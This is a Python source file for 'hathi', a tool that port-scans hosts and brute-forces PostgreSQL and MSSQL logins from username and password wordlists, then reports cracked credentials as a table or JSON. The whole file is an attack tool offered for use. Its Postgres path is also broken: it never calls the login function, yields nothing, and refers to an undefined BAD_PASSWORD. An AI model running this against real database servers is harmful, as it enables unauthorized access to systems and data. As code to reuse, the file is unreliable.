"""
Requirements:
 > pip install -r requirements.txt


Usage: hathi [-h] [--usernames USERNAMES] [--passwords PASSWORDS] [--results RESULTS] [--hostname HOSTNAME] [--verbose] host [host ...]

Port scan and dictionary attack postgresql servers.

positional arguments:
  host                  host to connect to

optional arguments:
  -h, --help            show this help message and exit
  --usernames USERNAMES
                        password list
  --passwords PASSWORDS
                        password list
  --results RESULTS     path to a results file
  --hostname HOSTNAME   an @hostname to append to the usernames
  --verbose
"""

import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import asyncio
import asyncpg
import pymssql
from typing import List, Optional
from collections import namedtuple
from enum import Enum
from rich.progress import Progress, BarColumn, ProgressColumn, Task
from rich.text import Text
from rich.console import Console
from rich.table import Table
import json

timeout = 1.0
SSL_MODE = (
    "require"  # require = required, Try SSL first and fallback to non-SSL if failed
)
POOL_SIZE = 10


class LoginAttemptSpeedColumn(ProgressColumn):
    def render(self, task: "Task"):
        """Show data transfer speed."""
        speed = task.finished_speed or task.speed
        if speed is None:
            return Text("?", style="progress.data.speed")
        return Text(f"{speed:>3.0f} attempt/s", style="progress.data.speed")


class TotalAttemptColumn(ProgressColumn):
    def render(self, task: "Task"):
        return Text(
            f"{task.completed}/{task.total} passwords", style="progress.data.speed"
        )


class HostType(Enum):
    Postgres = "postgres"
    Mssql = "mssql"


class PgResult(Enum):
    BadPassword = 1
    Success = 2
    BadUsername = 3
    Other = 4


DEFAULT_PORTS = {HostType.Postgres: 5432, HostType.Mssql: 1433}
DEFAULT_DATABASE_NAME = {HostType.Postgres: "postgres", HostType.Mssql: "master"}

Match = namedtuple("Match", "username password host database data")


async def try_hosts(hosts: List[str], port: int):
    found = 0
    for host in hosts:
        try:
            future = asyncio.open_connection(host=host, port=port)
            _, w = await asyncio.wait_for(future, timeout=timeout)
            yield host
            found += 1
            w.close()
        except (asyncio.TimeoutError, OSError):
            print(f"Could not connect to {host}")


async def _pg_try_host(host, username, password, database):
    try:
        conn = await asyncpg.connect(
            user=username,
            password=password,
            database=database,
            host=host,
            ssl=SSL_MODE,
            timeout=timeout,
        )
        await conn.close()
        return True
    except asyncpg.exceptions.InvalidPasswordError:
        return BAD_PASSWORD  # TODO : Signal bad login vs bad password
    except asyncpg.exceptions.InvalidAuthorizationSpecificationError:
        return False
    except asyncpg.exceptions._base.PostgresError:
        return False
    except asyncio.TimeoutError:
        return False


async def pg_try_connection(
    host: str,
    database: str,
    usernames: str,
    passwords: str,
    hostname: Optional[str] = None,
    verbose=False,
    multiple=False,
):
    with Progress(
        "[progress.description]{task.description}",
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TotalAttemptColumn(),
        LoginAttemptSpeedColumn(),
    ) as progress:
        with open(usernames, "r") as username_list:
            for username in username_list:
                username = username.strip()
                if hostname:
                    username = f"{username}@{hostname}"
                with open(passwords, "r") as password_list:
                    _passwords = password_list.readlines()
                    task = progress.add_task(
                        f"[red]Trying {username} on {host}...",
                        total=len(_passwords),
                        visible=verbose,
                    )
                    for password in _passwords:
                        password = password.strip()
                        progress.update(
                            task, advance=1, description=f"{username}:{password}"
                        )


def _mssql_try_host(host, username, password, database):
    try:
        conn = pymssql.connect(
            host,
            username,
            password,
            database,
        )
        conn.close()
        return True
    except pymssql.OperationalError:
        return False


def mssql_try_connection(
    host: str,
    database: str,
    usernames: str,
    passwords: str,
    hostname: Optional[str] = None,
    verbose=False,
    multiple=False,
):
    with Progress(
        "[progress.description]{task.description}",
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TotalAttemptColumn(),
        LoginAttemptSpeedColumn(),
    ) as progress:
        with open(usernames, "r") as username_list:
            for _username in username_list:
                username = _username.strip()
                if hostname:
                    username = f"{username}@{hostname}"
                with open(passwords, "r") as password_list:
                    _passwords = password_list.readlines()
                    task = progress.add_task(
                        f"[red]Trying {_username}...",
                        total=len(_passwords),
                        visible=verbose,
                    )
                    with ThreadPoolExecutor(max_workers=POOL_SIZE) as executor:
                        login_attempts = {
                            executor.submit(
                                _mssql_try_host,
                                host,
                                username,
                                password.strip(),
                                database,
                            ): (host, username, password.strip())
                            for password in _passwords
                        }
                        for future in as_completed(login_attempts):
                            host, username, password = login_attempts[future]
                            progress.update(task, advance=1)
                            try:
                                success = future.result()
                            except Exception as exc:
                                pass
                            else:
                                if success:
                                    yield Match(username, password, host, database, {})
                                    if not multiple:
                                        executor.shutdown(cancel_futures=True)
                                        progress.stop()
                                        return


async def scan(
    hosts: List[str],
    usernames: str,
    passwords: str,
    hostname: Optional[str] = None,
    verbose=False,
    host_type: HostType = HostType.Postgres,
    multiple: bool = False,
):
    open_hosts = []
    async for open_host in try_hosts(hosts, DEFAULT_PORTS[host_type]):
        open_hosts.append(open_host)

    database = DEFAULT_DATABASE_NAME[host_type]

    matched_connections = []

    if host_type == HostType.Postgres:
        for host in open_hosts:
            async for match in pg_try_connection(
                host, database, usernames, passwords, hostname, verbose, multiple
            ):
                matched_connections.append(match)
    elif host_type == HostType.Mssql:
        for host in open_hosts:
            for match in mssql_try_connection(
                host, database, usernames, passwords, hostname, verbose, multiple
            ):
                matched_connections.append(match)
    return matched_connections


def main():
    parser = argparse.ArgumentParser(
        description="Port scan and dictionary attack PostgreSQL and MSSQL servers."
    )
    parser.add_argument(
        "hosts", metavar="host", type=str, nargs="+", help="host to scan"
    )
    parser.add_argument(
        "--usernames", type=str, default="usernames.txt", help="password list"
    )
    parser.add_argument(
        "--passwords", type=str, default="passwords.txt", help="password list"
    )
    parser.add_argument(
        "--hostname", type=str, help="an @hostname to append to the usernames"
    )
    parser.add_argument("--mssql", action="store_true", help="Host is MSSQL")
    parser.add_argument("--postgres", action="store_true", help="Host is Postgres")
    parser.add_argument("--json", action="store_true", help="Output in JSON")
    parser.add_argument(
        "--multiple",
        action="store_true",
        help="Seek multiple username/password pairs on a single host",
    )

    args = parser.parse_args()
    start = time.time()

    host_type = HostType.Mssql if args.mssql else HostType.Postgres

    results: "List[Match]" = asyncio.run(
        scan(
            args.hosts,
            args.usernames,
            args.passwords,
            args.hostname,
            verbose=not args.json,
            host_type=host_type,
            multiple=args.multiple,
        )
    )

    if args.json:
        print(
            json.dumps(
                [
                    {
                        "host": result.host,
                        "database": result.database,
                        "username": result.username,
                        "password": result.password,
                    }
                    for result in results
                ]
            )
        )
    else:
        table = Table(title="Results")

        table.add_column("Host", justify="right", style="cyan", no_wrap=True)
        table.add_column("Database", style="magenta")
        table.add_column("Username", style="magenta")
        table.add_column("Password", justify="right", style="green")

        for result in results:
            table.add_row(
                result.host, result.database, result.username, result.password
            )

        console = Console()
        console.print(table)
        print("Completed scan in {0} seconds".format(time.time() - start))


if __name__ == "__main__":
    main()
